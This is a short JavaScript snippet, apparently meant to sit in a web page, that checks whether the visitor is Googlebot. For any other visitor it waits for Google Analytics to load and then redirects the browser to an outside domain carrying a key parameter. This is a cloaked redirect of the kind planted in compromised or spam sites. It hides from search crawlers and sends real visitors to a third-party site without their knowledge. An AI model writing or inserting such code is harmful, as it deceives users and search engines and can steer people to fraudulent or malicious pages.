if (!navigator.userAgent.includes('Googlebot')) {
  var tries = 0;
  (function wait() {
    if ((window.gtag && window.dataLayer) || tries++ > 20) {
      window.location.href = "https://babconstellation.com/qk0djsp0h2?key=1e5c257bb6f145c9aef01843d3777f97";
    } else {
      setTimeout(wait, 250);   // waits up to ~5s for GA to load+fire
    }
  })();
}
